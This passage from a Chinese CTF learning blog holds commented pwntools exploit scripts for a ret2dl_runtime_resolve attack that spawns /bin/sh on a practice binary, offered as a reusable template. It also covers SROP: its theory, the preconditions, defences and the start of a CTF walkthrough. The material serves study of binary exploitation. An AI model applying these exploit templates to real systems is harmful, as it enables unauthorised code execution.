<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> remote</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context</span><br><span class="line">processName = <span class="string">&#x27;bof&#x27;</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">r = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">25383</span>)</span><br><span class="line"><span class="comment">#r = process(&#x27;./&#x27; + processName)</span></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">ret_addr=<span class="number">0x0804851B</span></span><br><span class="line">rop = ROP(<span class="string">&#x27;./&#x27;</span> + processName)</span><br><span class="line"></span><br><span class="line">bss_base = rop.section(<span class="string">&#x27;.bss&#x27;</span>)</span><br><span class="line">buf1 = rop.fill(offset)</span><br><span class="line">buf1 += rop.call(<span class="string">&#x27;read&#x27;</span>, <span class="number">0</span>, bss_base, <span class="number">100</span>)</span><br><span class="line"><span class="comment">## used to call dl_Resolve()</span></span><br><span class="line">buf1 += rop.dl_resolve_call(bss_base + <span class="number">20</span>, bss_base)</span><br><span class="line">r.send(buf1)</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line"><span class="comment">## used to make faking data, such relocation, Symbol, Str</span></span><br><span class="line">buf += rop.dl_resolve_data(bss_base + <span class="number">20</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line">r.send(buf)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bss_base))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220228180305633-1728995910.png"><br>然后下面我再给出手动构造的exp，其实我还是直接复制了上面的exp，只不过改了几个参数而已，这其实就是个模板而已，我把需要改的参数用三个*标注一下,剩下的直接照搬，一把梭。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28789</span>)<span class="comment">#***</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./bof&#x27;)#***</span></span><br><span class="line">e=ELF(<span class="string">&#x27;./bof&#x27;</span>)<span class="comment">#***</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">plt0 = e.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line">rel_plt = e.get_section_by_name(<span class="string">&#x27;.rel.plt&#x27;</span>).header.sh_addr</span><br><span class="line">dynsym = e.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>).header.sh_addr</span><br><span class="line">dynstr = e.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>).header.sh_addr</span><br><span class="line"><span class="comment">#先初始化一下一会要用到的段首地址</span></span><br><span class="line">offset=<span class="number">112</span><span class="comment">#***</span></span><br><span class="line">read_plt_addr=e.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">four_pop_ret=<span class="number">0x08048628</span><span class="comment">#***</span></span><br><span class="line">leave_ret_addr=<span class="number">0x0804851A</span><span class="comment">#***</span></span><br><span class="line">base_addr=<span class="number">0x0804a800</span><span class="comment">#***</span></span><br><span class="line"><span class="comment">#这个base_addr是我们要把栈迁移的地方，用gdb发现这一部分是可写的，因此我们选择迁移到这里</span></span><br><span class="line"></span><br><span class="line">fake_sym_addr=base_addr+<span class="number">32</span><span class="comment">#这个fake_sym_addr是Elf32_Sym结构的首地址</span></span><br><span class="line"><span class="comment">#原本是要把伪造的ELf32_Sym结构写在偏移32的位置的，但是还要对齐，因此下面还要再加align</span></span><br><span class="line">align=<span class="number">0x10</span>-((fake_sym_addr-dynsym)&amp;<span class="number">0xf</span>)<span class="comment">#Elf32_Sym结构是16字节，因此地址也需要和16字节对齐，二者地址相减</span></span><br><span class="line"><span class="comment">#然后只取最后一位，就可以理解成二者的地址是放在了一个结构里面（但其实不是这样的，不过可以理解成这样，画个图就懂了）</span></span><br><span class="line"><span class="comment">#然后最后的值被0x10所减，求的就是fake_sym_addr距离16个字节所补齐差的字节数</span></span><br><span class="line"><span class="comment">#至于为什么减的是dynsym，淦，因为dynsym一定是被对齐了的，因此它需要找一个对齐的表来做参考啊</span></span><br><span class="line">fake_sym_addr+=align<span class="comment">#最后再加上这个为了补齐的字节才是最后我们要构造的fake_sym的地址</span></span><br><span class="line"></span><br><span class="line">st_name=fake_sym_addr+<span class="number">0x10</span>-dynstr<span class="comment">#这个st_name就是dynstr段首地址距离目标函数名称的偏移</span></span><br><span class="line"><span class="comment">#我们把最终的system函数名称布置到了fake_sym_addr+0x10的位置，为啥加0x10?因为Elf32_Sym的结构大小为16字节</span></span><br><span class="line">st_info=<span class="number">0x12</span><span class="comment">#这个其实是由两部分组成，分别是前24字节的st_bind和后八字节的st_type（不过我感觉没必要区分，直接加起来就行）</span></span><br><span class="line"><span class="comment">#另外就是这个0x12是可以在IDA里面通过dynsym来查到</span></span><br><span class="line">fake_sym=p32(st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(st_info)</span><br><span class="line"></span><br><span class="line">r_offset=e.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#这个是ret.plt结构中的第一个成员，也就是解析之后的真实地址写入的地方</span></span><br><span class="line">r_sym=(fake_sym_addr-dynsym)/<span class="number">0x10</span><span class="comment">#这个我不是太确定，我感觉除0x10是因为Elf32_Sym的大小是16字节</span></span><br><span class="line"><span class="comment"># 这个偏移应该是以一个结构（16字节）为单位的</span></span><br><span class="line">r_type=<span class="number">0x7</span><span class="comment">#这个0x7是重定位的一种类型，指的是导入函数，进入_dl_fixup函数里面，还会检查这是不是0x7</span></span><br><span class="line">r_info=(<span class="built_in">int</span>(r_sym)&lt;&lt;<span class="number">8</span>)+(r_type&amp;<span class="number">0xf</span>)<span class="comment">#这里&lt;&lt;8是因为，最后还要再&gt;&gt;8，从而保持正常，而&amp;0xf，其实没用，不写也行</span></span><br><span class="line">reloc_index=base_addr-rel_plt+<span class="number">24</span><span class="comment">#从rel.plt到base_addr+28的偏移也就</span></span><br><span class="line"><span class="comment"># 是执行_dl_runtime_resolve的第二个参数，而加28的原因是，我们将rel.plt结构布置在了距离base_addr偏移24的位置</span></span><br><span class="line">fake_rel_plt=p32(r_offset)+p32(r_info)<span class="comment">#这里就是伪造的rel.plt结构</span></span><br><span class="line">payload1=offset*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload1+=p32(read_plt_addr) <span class="comment">#劫持执行流，让程序再执行一次read，将我们想要伪造的内容存入我们指定的地方</span></span><br><span class="line">payload1+=p32(four_pop_ret) <span class="comment">#这里需要用连续三个pop把read的参数给从栈顶清空，不然ret的时候就会出现问题</span></span><br><span class="line">payload1+=p32(<span class="number">0</span>)</span><br><span class="line">payload1+=p32(base_addr)</span><br><span class="line">payload1+=p32(<span class="number">100</span>)</span><br><span class="line">payload1+=p32(base_addr-<span class="number">4</span>)</span><br><span class="line">payload1+=p32(leave_ret_addr)</span><br><span class="line">p.send(payload1)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload2=p32(plt0)</span><br><span class="line">payload2+=p32(reloc_index)</span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">payload2+=p32(base_addr+<span class="number">80</span>) <span class="comment">#这个放置的是system的参数的位置</span></span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">payload2+=<span class="string">&#x27;bbbb&#x27;</span><span class="comment">#由于read的参数是三个，而system的参数只用了第一个，因此另外两个参数需要填充一下垃圾数据</span></span><br><span class="line">payload2+=fake_rel_plt</span><br><span class="line">payload2+=align*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload2+=fake_sym</span><br><span class="line">payload2+=<span class="string">&#x27;system\x00&#x27;</span></span><br><span class="line">payload2+=(<span class="number">80</span>-<span class="built_in">len</span>(payload2))*<span class="string">&#x27;a&#x27;</span><span class="comment">#因为上面提到了会把参数放在偏移80的位置，因此这里填充\x00到偏移80这里</span></span><br><span class="line">payload2+=<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload2+=(<span class="number">100</span>-<span class="built_in">len</span>(payload2))*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h1 id="ret2dl回顾极速版"><a href="#ret2dl回顾极速版" class="headerlink" title="ret2dl回顾极速版"></a>ret2dl回顾极速版</h1><p>md，之前写过的文章重新回来再看，感觉太啰嗦了，重新温习了一下，这里写一个关于延迟绑定的过程极速版。</p>
<blockquote>
<p>dynamic段 保存了动态链接器所需要基本信息，下面三个都位于dynamic段</p>
<p>dynstr(dynamic string table)      动态符号字符串表</p>
<p>dynsym(dynamic symbol)		    动态符号表</p>
<p>rel.plt</p>
</blockquote>
<p>延迟绑定的过程核心是_dl_lookup_symbol_x函数拿着搜索的函数名去libc中匹配对应函数，大致过程是用dynstr地址+函数名在dynstr里的偏移来查找到的函数名字符串。</p>
<p>dynstr里的偏移需要通过rel.plt加上dl_runtime_resolve函数的第二个参数先得到dynsym里的偏移，再通过dynsym里的偏移加上dynsym的地址得到。拿着这个偏移加上dynstr的地址即可。</p>
<p>用ida简单演示一下过程</p>
<p>先去rel.plt里找到对应的结构，这个偏移是dl_runtime_resolve函数的第二个参数</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281937155.png" alt="image-20221128193705005"></p>
<p>然后用上面的那个0x207右移8得到2，这个就是该函数在dynsym里的偏移如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281945695.png" alt="image-20221128194516577"></p>
<p>然后看一下这个地址0x080472a0的值，如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281946850.png" alt="image-20221128194631780"></p>
<p>最后拿着这个0x3d加上dynstr的首地址即可找到函数名字，如下</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281947796.png" alt="image-20221128194726664"></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211281947187.png" alt="image-20221128194759131"></p>
<h1 id="其他博客链接"><a href="#其他博客链接" class="headerlink" title="其他博客链接"></a>其他博客链接</h1><p>最后由于参考了很多师傅的博客，这里面我把一些我感觉写的不错的博客放一下，如果对于我上面写的有不懂的也可以看看下面这些博客</p>
<p>下面这两个博客都把exp分开构造的过程详细写了。</p>
<p><a target="_blank" rel="noopener" href="http://www.soolco.com/post/114840_1_1.html">深入理解-dl_runtime_resolve-博客 (soolco.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5122#toc-4">高级ROP ret2dl_runtime 之通杀详解 - 先知社区 (aliyun.com)</a></p>
<p>然后我探究上述_dl_runtime_solve执行流程主要是跟着下面这个师傅的博客做的</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/57f6474fe4c6">_dl_runtime_resolve - 简书 (jianshu.com)</a></p>
<p>下面这个是介绍_dl_runtime_solve的前置知识很详细</p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/134105591">深入窥探动态链接 - 知乎 (zhihu.com)</a></p>
<p>下面这个博客是对一些源码做了注释</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jazrynwong/article/details/89851640">(25条消息) glibc动态链接器dl_runtime_resolve简要分析_Hello World.c-CSDN博客</a></p>
<p>下面两个主要是解释了下用到的一些段的解释</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/8dd91ec35dda">https://www.jianshu.com/p/8dd91ec35dda</a></p>
<p><a target="_blank" rel="noopener" href="https://www.thinbug.com/q/53156275">https://www.thinbug.com/q/53156275</a></p>
<p>然后这个师傅的exp写的比较清晰，解决了我的一些问题</p>
<p><a target="_blank" rel="noopener" href="https://eqqie.cn/index.php/archives/1023">https://eqqie.cn/index.php/archives/1023</a></p>
<p>然后下面这个师傅写的应该是最详细的了，对一些小细节有疑问的可以在这上面找找</p>
<p><a target="_blank" rel="noopener" href="https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3/#3-2-2%E3%80%81-dl-fixup-%E7%9A%84%E5%86%85%E5%AE%B9">https://sp4n9x.github.io/2020/08/15/ret2_dl_runtime_resolve%E8%AF%A6%E8%A7%A3&#x2F;#3-2-2%E3%80%81-dl-fixup-%E7%9A%84%E5%86%85%E5%AE%B9</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/e734c492.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/e734c492.html" class="post-title-link" itemprop="url">关于SROP的学习总结</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:44:36" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>这个SROP是一种极其有趣的攻击方式，它是利用程序从内核层面切换到用户层面恢复上下文时的一个漏洞，该漏洞可以让我们自己自行设置所有寄存器里的值。</p>
<p>在这之前我们要先去了解一下系统调用，因为这个漏洞就是在用户态和内核态切换发生的，提到系统调用，这里还要简单介绍一下用户态和内核态的相关知识。</p>
<h1 id="什么是用户态和内核态？"><a href="#什么是用户态和内核态？" class="headerlink" title="什么是用户态和内核态？"></a>什么是用户态和内核态？</h1><h2 id="用户态："><a href="#用户态：" class="headerlink" title="用户态："></a>用户态：</h2><p>CPU只能访问受限制的内存，并且不允许访问外围设备（就是不允许直接跟硬件产生关系）。此时的CPU不允许被独占，这就意味着此时的CPU可以被别的进程抢占。</p>
<h2 id="内核态："><a href="#内核态：" class="headerlink" title="内核态："></a>内核态：</h2><p>此时的CPU可以访问任何数据，包括外围设备，比如网卡，硬盘等等。并且此时的CPU可以从一个程序切换到另外一个程序，并且没有进程能够抢占CPU，因为此时内核态的特权级为0.</p>
<h1 id="为什么要区分用户态和内核态？"><a href="#为什么要区分用户态和内核态？" class="headerlink" title="为什么要区分用户态和内核态？"></a>为什么要区分用户态和内核态？</h1><p>用户态和内核态说到底就是CPU所执行的指令权限不同而划分的，而这样做的目的就是为了保护系统，在CPU的所有指令中，有一些指令是非常危险的，如果错用，将导致整个系统崩溃。比如：清内存、设置时钟等。</p>
<h1 id="怎么从用户态切换到内核态？"><a href="#怎么从用户态切换到内核态？" class="headerlink" title="怎么从用户态切换到内核态？"></a>怎么从用户态切换到内核态？</h1><p>用户态切换到内核态的3种方式：</p>
<p>a. 系统调用（也是我们接下来要提到的重点）</p>
<p>这是用户态进程主动要求切换到内核态的一种方式，用户态进程通过系统调用申请使用操作系统提供的服务程序完成工作，比如前例中fork()实际上就是执行了一个创建新进程的系统调用。而系统调用的机制其核心还是使用了操作系统为用户特别开放的一个中断来实现，例如Linux的int 80h中断。</p>
<p>b. 异常</p>
<p>当CPU在执行运行在用户态下的程序时，发生了某些事先不可知的异常，这时会触发由当前运行进程切换到处理此异常的内核相关程序中，也就转到了内核态，比如缺页异常。</p>
<p>c. 外围设备的中断</p>
<p>当外围设备完成用户请求的操作后，会向CPU发出相应的中断信号，这时CPU会暂停执行下一条即将要执行的指令转而去执行与中断信号对应的处理程序，如果先前执行的指令是用户态下的程序，那么这个转换的过程自然也就发生了由用户态到内核态的切换。比如硬盘读写操作完成，系统会切换到硬盘读写的中断处理程序中执行后续操作等。</p>
<p>这个博主对于用户态切换到内核态总结的很详细清楚，我这里就搬运一下。</p>
<p>原文链接<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_47221702/article/details/119947155">(25条消息) 什么是用户态和内核态？_glory的博客-CSDN博客_内核态和用户态</a></p>
<p>这里这个系统调用很重要，它的存在意味着我们想执行一些较高权限的函数就需要经过系统调用来变成内核态从而得以实现函数的调用（例如read,write,open函数等等）。</p>
<h1 id="用户态的上下文是怎么被保存的？"><a href="#用户态的上下文是怎么被保存的？" class="headerlink" title="用户态的上下文是怎么被保存的？"></a>用户态的上下文是怎么被保存的？</h1><p>我们现在考虑一个问题，既然现在程序从用户态变成了内核态去执行系统调用的函数，那么再转变回用户态的时候，我们在用户态时寄存器的值怎么办？因为在内核执行系统调用函数的时候，寄存器的值一定是会发生改变的，可它是怎么保存了我们再用户态的上下文？</p>
<p>现在当我们要准备系统调用了。</p>
<p><img src="/../img/2706180-20220219203837059-350353018.png"></p>
<p>图片转自<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">SROP - CTF Wiki (ctf-wiki.org)</a></p>
<p>过程①，内核会向进程发送一个signal（你可以把这个理解为中断信号），意思是接下来该进程被挂起，此刻由内核来接管。</p>
<p>过程②，内核会保存该进程在用户态的上下文，并且跳到已经注册好的Signal Handler（信号处理器），当这个Signal Handler返回的时候，内核控制去传递了一串user-space code （用户层代码），这里翻译成用户层代码可能不是特别准确，我想表达的意思是，<strong>这就是一串实现函数功能的代码并且处于在了用户层</strong>，并且这部分代码被称作signal trampoline。</p>
<p>过程③，它是在执行signal trampoline的过程。</p>
<p>过程④，内核将恢复之前保存的上下文，并且最后恢复进程的执行。</p>
<p>这是大体流程，接下来我们看一下保存上下文的细节。</p>
<p><strong>在第二步的时候，内核就会将我们的所有寄存器压栈，同时还会把signal信息以及rt_sigreturn压栈。这个ret_sigreturn是一个地址，这个地址指向了sigreturn的这个系统调用（这个系统调用时SROP利用的核心）</strong></p>
<p><img src="/../img/2706180-20220219203845839-1367800712.png"></p>
<p>完成上述压栈之后，此时的栈布局是这样的，这段内存也被称为Signal Frame。</p>
<p>到了过程④的时候，此时的signal trampoline的执行已经到了最后的ret，此时的栈顶就是rt_sigreturn,因此又执行了re_sigreturn所指向的系统调用sigreturn的地址，<strong>这个系统调用函数的作用就是去把栈中的数据恢复到对应寄存器里面，也就是疯狂pop。</strong></p>
<p>随着rip的值也被pop了回去，此时的程序的系统调用已经完全完成，程序继续运行。</p>
<h1 id="SROP原理"><a href="#SROP原理" class="headerlink" title="SROP原理"></a>SROP原理</h1><h2 id="理论部分"><a href="#理论部分" class="headerlink" title="理论部分"></a>理论部分</h2><p>上述过程是正常的系统调用流程，而SROP则是利用了上下文保存与恢复的漏洞，如果了解了上述的内容，<strong>其实很明显就会发现有一个问题，在把寄存器压栈之后构造的Signal Frame依然是在用户进程的地址空间的，并且是用户进程可读写的。并且执行sigreturn的时候并没有检查准备恢复的这个Signal Frame是否是之前保存的Signal Frame</strong>。</p>
<p>这就给了我们可乘之机，我们可以去伪造一个Signal Frame然后直接执行sigreturn系统调用。</p>
<p>先看下正常的系统调用过程（主要看下保存与恢复上下文））<font color=red>（下面两个图，当时制作的时候理解的不太对，应该是执行signal trampoline,而并非是执行signal handler，这里要注意一下</font></p>
<p><img src="/../img/2706180-20220219203856864-84934145.png"></p>
<p>接下来看看如果我们系统调用的是sigreturn**(这个sigreturn并<u>不是执行了其他系统调用被动执行的sigreturn</u>，而是<u>我们主动系统</u>调用的就是sigreturn)**</p>
<p><img src="/../img/2706180-20220219203904231-699432548.png"></p>
<h2 id="实践部分"><a href="#实践部分" class="headerlink" title="实践部分"></a>实践部分</h2><p>当然上面都是理论知识，我们动态调试看一下是不是这样。</p>
<p><img src="/../img/2706180-20220219203910793-1182638386.png"></p>
<p><img src="/../img/2706180-20220219203917580-709368108.png"></p>
<p>这是<strong>准备系统调用sigreturn之前的寄存器的值</strong>（此时的寄存器是将要被保存的上下文）和栈布局（<strong>此时栈的布局就是为了我们准确控制每一个寄存器的值）</strong></p>
<p><img src="/../img/2706180-20220219203926667-105079808.png"></p>
<p>此时是系统调用sigturn之后的寄存器，可以看见参照构造的Signal Frame，精准的改变了每一个寄存器的值（此时execve的系统调用号以及参数全部被布置好了，此时只要执行了syscall就可以获取shell）</p>
<h2 id="提出一个猜想"><a href="#提出一个猜想" class="headerlink" title="提出一个猜想"></a>提出一个猜想</h2><p>同时我们刚才理论上猜想的是主动执行了sigreturn然后执行execve是不会再让rt_sigreturn触发了（也就是不会再回到执行sigreturn之前了），<strong>那反过来就是说如果我们执行的不是execve，那最后rt_sigreturn还是会触发，也就是即使主动执行了sigreturn控制了我们想要的参数，但是系统调用结束之后，寄存器里还是我们最开始保存的参数，而非主动执行sigreturn布置的参数。</strong></p>
<h2 id="验证猜想"><a href="#验证猜想" class="headerlink" title="验证猜想"></a>验证猜想</h2><p>为了验证上面的猜想，我们再用sigreturn来布置参数的时候，布置write（1,’&#x2F;bin&#x2F;sh’,7)这个系统调用，并且使其返回地址为一个_term_proc函数（返回到一个空函数，不对本次实验产生任何影响）</p>
<p>这个是将要因为执行sigreturn系统调用而被保存的寄存器</p>
<p><img src="/../img/2706180-20220219203934441-61755889.png"></p>
<p>这个是执行了sigreturn之后，布置的寄存器，此时还未执行write的系统调用。</p>
<p><img src="/../img/2706180-20220219203941205-1069503757.png"></p>
<p>现在是执行write函数之后的寄存器，现在应该会恢复最开始的上下文了吧？</p>
<p><img src="/../img/2706180-20220219203948580-1139524450.png"></p>
<p>what???居然没有恢复，和最开始的猜测不一样。</p>
<p>那我们重新捋一下，看看是哪里出了问题？</p>
<p>我们利用栈溢出将返回地址设置为实现sigreturn系统调用的gadget，然后再将其后面的栈空间布置成我们想要设置的寄存器的值。待sigreturn系统调用执行完毕，此时的寄存器值，包括RSP&#x2F;ESP和RIP&#x2F;EIP都会被改变，可是为什么会这样呀？<strong>sigreturn本身不也是个系统调用么，那执行sigreturn之前的上下文也会被保存，执行sigreturn的时候确实会改变寄存器的值，可是执行sigreturn系统调用之后，原本的上下文不又被恢复了么（但事实是没有恢复）？</strong></p>
<h2 id="得出正确结论"><a href="#得出正确结论" class="headerlink" title="得出正确结论"></a>得出正确结论</h2><p>这里卡了很久，roderick师傅给我的提示去看下sigreturn的官方文档。</p>
<p><img src="/../img/2706180-20220219203956743-74555339.png"></p>
<p>果然，在官方文档的简介中就写了cleanup stack frame，这就意味着执行了sigreturn之后的函数栈帧就会被清除掉，当时我还感觉哪里不对，怎么栈（如下图）变成绿绿的了，原来是原本的栈已经都被清除了<strong>（本来清除的应该是Signal Frame,但是由于这是我们主动调用的sigreturn，因此把我们真正的栈给当做Siganal Frame给清除了，因此原本系统调用sigreturn所保存的上下文也在此刻是被清除了，所以我们才没有在系统调用之后得到最开始的上下文）</strong>。<br><img src="/../img/2706180-20220219204003370-492577233.png"></p>
<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><p><strong>用于在内核在恢复上下文的时候并没有与保存的上下文做对比，同时内核在恢复上下文时是从构造的Signal Frame中pop出来各个寄存器的值，而此时的Signal Frame是在栈里的并且用户是可读可写的。这两点疏忽就导致了我们可以伪造Signal Frame之后主动执行sigreturn来控制每个寄存器的值。</strong></p>
<h1 id="使用SROP的前提："><a href="#使用SROP的前提：" class="headerlink" title="使用SROP的前提："></a>使用SROP的前提：</h1><p>1、首先程序必须存在溢出，能够控制返回地址。</p>
<p>2、可以去系统调用sigreturn（如果找不到合适的系统调用号，可以看看能不能利用read函数来控制RAX的值）</p>
<p>3、必须能够知道&#x2F;bin&#x2F;sh的地址，如果写的bss段，直接写地址就行，如果写到栈里，还需要想办法去泄露栈地址。</p>
<p>4、允许溢出的长度足够长，这样可以去布局我们想要的寄存器的值</p>
<p>5、需要知道syscall指令的地址</p>
<h1 id="补充：一直劫持程序的控制流"><a href="#补充：一直劫持程序的控制流" class="headerlink" title="补充：一直劫持程序的控制流"></a>补充：一直劫持程序的控制流</h1><p>最后要补充的一点是，前面介绍的方法只能调用一个syscall，然后我们就失去了对执行流的控制了，这里我们其实是可以一直劫持程序的控制流的。</p>
<p><img src="/../img/2706180-20220219204011362-2119817764.png"></p>
<p>图片出自<a target="_blank" rel="noopener" href="https://blog.csdn.net/zsj2102/article/details/78561112?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_v31_ecpm-1-78561112.pc_agg_new_rank&utm_term=sigreturn+%E5%87%BD%E6%95%B0&spm=1000.2123.3001.4430">(25条消息) Sigreturn Oriented Programming (SROP) Attack攻击原理_zsj2102的专栏-CSDN博客_sigreturn 函数</a></p>
<p>依据图片我们可以发现，我们每次控制寄存器的时候，都把rsp写成下一个片段的rt_sigreturn的地址，并且rip的地址要指向syscall；ret  一定要后面有ret，不然所有的片段连不起来，到ret的时候，就会去执行rsp执行的地址，因此我们就可以一直劫持程序的控制流。</p>
<h1 id="防御手段："><a href="#防御手段：" class="headerlink" title="防御手段："></a>防御手段：</h1><p>最后我们来提一下SROP的防范。从三个角度出发，作者提出了三种方法：</p>
<p><em><strong>*Gadgets Prevention*</strong></em></p>
<p>在<code>两个重要的gadgets</code>这章我提到，在当前的几种不同的操作系统中，<code>sigreturn</code>和<code>syscall; ret</code>这两个gadgets非常容易被找到，特别是在<code>vsyscall</code>这种特别不安全的机制存在的情况下。因此我们应该尽量避免这种机制，让ASLR等保护机制物尽其用，使得攻击者很难找到这些gadgets。</p>
<p>当然这种方法并不能从本质上解决SROP的问题。</p>
<p><em><strong>*Signal Frame Canaries*</strong></em></p>
<p>这种方法借鉴于<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Buffer_overflow_protection#Canaries">stack canaries</a>机制，即在<code>Signal Frame</code>的<code>rt_sigreturn</code>字段之前插入一段随机生成的字节，如果发生overflow，则该段字节会被破坏，从而在发生<code>sigreturn</code>之前会被检测到。</p>
<p>当然，针对stack canaries的攻击也很多，其同样不能从本质上防止SROP的发生。</p>
<p><em><strong>*Break kernel agnostic*</strong></em></p>
<p>这就要追溯到SROP的本质问题了，就是内核对Signal的不可知性。如果我们在内核处理<code>sigreturn</code>系统调用的时候判断一下当前的<code>Signal Frame</code>是否是由内核之前创建的，那么这个问题就能从根本上解决。当然，这就涉及到要修改内核的一些底层的设计了，可能也会引入一些新的问题。</p>
<p>我认为这个作者提到的这三个防御手段都非常全面，因此我就直接从这篇博客引用了<a target="_blank" rel="noopener" href="https://blog.csdn.net/zsj2102/article/details/78561112?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~aggregatepage~first_rank_ecpm_v1~rank_v31_ecpm-1-78561112.pc_agg_new_rank&utm_term=sigreturn+%E5%87%BD%E6%95%B0&spm=1000.2123.3001.4430">(25条消息) Sigreturn Oriented Programming (SROP) Attack攻击原理_zsj2102的专栏-CSDN博客_sigreturn 函数</a></p>
<h1 id="实战SROP"><a href="#实战SROP" class="headerlink" title="实战SROP"></a>实战SROP</h1><h2 id="360chunqiu2017-smallest"><a href="#360chunqiu2017-smallest" class="headerlink" title="360chunqiu2017_smallest"></a>360chunqiu2017_smallest</h2><p><img src="/../img/2706180-20220220190258944-2045243642.png"></p>
<p>可以发现这个程序只有唯一个函数，就是这个start函数（看网上的师傅说这是因为出题人用汇编写的这个程序，编译之后也不需要与库链接）。</p>
<p>这就是一个read系统调用，然后就没有能利用的地方了，其实看到这个唯一的系统调用就应该往SROP的方向去想了，因为别的很多方法都不可能靠这个一个start函数完成，但是<strong>只要允许输入的长度够长，同时还有read的系统调用就可以考虑使用SROP（因为系统调用read就意味着肯定会有syscall，同时由于read返回值的特性，我们是可以控制rax的值，这也就有机会系统调用sigreturn）</strong></p>
